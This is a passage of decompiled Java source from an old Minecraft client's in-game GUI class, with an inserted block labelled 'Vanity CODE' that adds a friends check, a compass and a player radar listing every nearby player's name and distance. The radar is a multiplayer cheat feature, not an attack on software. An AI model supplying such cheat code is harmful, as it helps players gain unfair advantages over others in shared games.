	{
		if (!isChatOpen())
		{
			return null;
		}

		ScaledResolution scaledresolution = new ScaledResolution(mc.gameSettings, mc.displayWidth, mc.displayHeight);
		par2 = par2 / scaledresolution.scaleFactor - 40;
		par1 = par1 / scaledresolution.scaleFactor - 3;

		if (par1 < 0 || par2 < 0)
		{
			return null;
		}

		int i = Math.min(20, chatMessageList.size());

		if (par1 <= 320 && par2 < mc.fontRenderer.FONT_HEIGHT * i + i)
		{
			int j = par2 / (mc.fontRenderer.FONT_HEIGHT + 1) + field_50017_n;
			return new ChatClickData(mc.fontRenderer, (ChatLine)chatMessageList.get(j), par1, (par2 - (j - field_50017_n) * mc.fontRenderer.FONT_HEIGHT) + j);
		}
		else
		{
			return null;
		}
	}

	public void setRecordPlayingMessage(String par1Str)
	{
		recordPlaying = (new StringBuilder()).append("Now playing: ").append(par1Str).toString();
		recordPlayingUpFor = 60;
		recordIsPlaying = true;
	}

	/**
	 * Return true if chat gui is open
	 */
	 public boolean isChatOpen()
	{
		 return mc.currentScreen instanceof GuiChat;
	}

	/**
	 * Adds the string to chat message after translate it with the language file.
	 */
	 public void addChatMessageTranslate(String par1Str)
	 {
		 StringTranslate stringtranslate = StringTranslate.getInstance();
		 String s = stringtranslate.translateKey(par1Str);
		 addChatMessage(s);
	 }
	 /** START Vanity CODE **/ static boolean IsFriends(String s)
	 {
		 try
		 {
			 for(int i = 0; i < Vanity.friends.size(); i++)
			 {
				 if(Vanity.friends.get(i) != null && ((String)Vanity.friends.get(i)).toLowerCase().equals(s.toLowerCase()))
				 {
					 return true;
				 }
			 }
			 return false;
		 }
		 catch(Exception exception)
		 {
			 exception.printStackTrace();
		 }
		 return false;
	 }
	 public void renderCompass()
	 {
		 ScaledResolution scaledresolution = new ScaledResolution(mc.gameSettings, mc.displayWidth, mc.displayHeight);
		 int i = scaledresolution.getScaledWidth();
		 int j = scaledresolution.getScaledHeight();
		 FontRenderer fontrenderer = mc.fontRenderer;
		 drawBorderedRect(i / 2 - 94, 2, i / 2 + 94, 13, 1, 0xffffffff, 0xff000000);
		 int r = 0;
		 if(mc.thePlayer.rotationYaw < 0)
		 {
			 r = -MathHelper.floor_double(mc.thePlayer.rotationYaw % 360);
		 }else
		 {
			 r = MathHelper.floor_double(mc.thePlayer.rotationYaw % 360);
		 }
		 boolean flag1 = (r > 0 && r < 180);
		 boolean flag2 = (r <= 270 && r >= 90);
		 boolean flag3 = (r <= 180 && r >= 0);
		 boolean flag4 = mc.thePlayer.rotationYaw < 0;
		 if(r == 0)
		 {
			 drawCenteredString(fontrenderer, "S", i / 2, 4, 0xffffff);
			 drawCenteredString(fontrenderer, "E", (i / 2) - 90, 4, 0xffffff);
			 drawCenteredString(fontrenderer, "W", (i / 2) + 90, 4, 0xffffff);
		 }else
			 if(!flag4)
			 {
				 drawCenteredString(fontrenderer, flag2 ? "N" : "", (i / 2 - r) + 180, 4, 0xffffff);
				 if(!flag1)
				 {
					 r = r - 360;
				 }
				 drawCenteredString(fontrenderer, !flag2 ? "S" : "", i / 2 - r, 4, 0xffffff);
				 drawCenteredString(fontrenderer, !flag3 ? "E" : "", (i / 2 - r) - 90, 4, 0xffffff);
				 drawCenteredString(fontrenderer, flag3 ? "W" : "", (i / 2 - r) + 90, 4, 0xffffff);
			 }else
				 if(flag4)
				 {
					 drawCenteredString(fontrenderer, flag2 ? "N" : "", (i / 2 + r) - 180, 4, 0xffffff);
					 if(!flag1)
					 {
						 r = r - 360;
					 }
					 drawCenteredString(fontrenderer, !flag2 ? "S" : "", i / 2 + r, 4, 0xffffff);
					 drawCenteredString(fontrenderer, !flag3 ? "W" : "", (i / 2 + r) + 90, 4, 0xffffff);
					 drawCenteredString(fontrenderer, flag3 ? "E" : "", (i / 2 + r) - 90, 4, 0xffffff);
				 }
	 }
	 public void renderRadar() 
	 {
		 ScaledResolution scaledresolution = new ScaledResolution(mc.gameSettings, mc.displayWidth, mc.displayHeight);
		 int k = scaledresolution.getScaledWidth();
		 int l = scaledresolution.getScaledHeight();
		 FontRenderer font = mc.fontRenderer;
		 FontRenderer fontrenderer = mc.fontRenderer;
		 String coords = "";
		 String stringtorender = "";
		 fontrenderer.drawString(stringtorender, k - 2 - fontrenderer.getStringWidth(stringtorender), l - 14, 0xFFFF00);
		 Iterator iterator = mc.theWorld.playerEntities.iterator();
		 int j3 = 0;
		 do
		 {
			 if(!iterator.hasNext())
			 {
				 break;
			 }
			 EntityPlayer entityplayer = (EntityPlayer)iterator.next();
			 if(entityplayer.username != mc.thePlayer.username)
			 {
				 int j6 = (int)Math.sqrt((mc.thePlayer.posX - entityplayer.posX) * (mc.thePlayer.posX - entityplayer.posX) + (mc.thePlayer.posY - entityplayer.posY) * (mc.thePlayer.posY - entityplayer.posY) + (mc.thePlayer.posZ - entityplayer.posZ) * (mc.thePlayer.posZ - entityplayer.posZ));
				 String s = (new StringBuilder()).append(entityplayer.username).append(" - (" + j6 + ")").toString();
				 if(j6 <= 30)
				 {
					 fontrenderer.drawString(s, k - (12 + 2 + fontrenderer.getStringWidth(s)), l - (12 + 12 * j3), 0xFF0000);
				 } else
					 if(j6 <= 65)
					 {
						 fontrenderer.drawString(s, k - (12 + 2 + fontrenderer.getStringWidth(s)), l - (12 + 12 * j3), 0xFFE311);
					 } else
						 if(j6 >= 65)
						 {
							 fontrenderer.drawString(s, k - (12 + 2 + fontrenderer.getStringWidth(s)), l - (12 + 12 * j3), 0x0CB633);
						 }
				 j3++;
			 }
		 } while(true);
	 }
	 public void drawBorderedRect(int x, int y, int x1, int y1, int size, int borderC, int insideC) 
	 {
		 drawRect(x, y, x1, y1, borderC);
		 drawRect(x + size, y + size, x1 - size, y1 - size, insideC);
	 }
	 /** END Vanity CODE **/
}
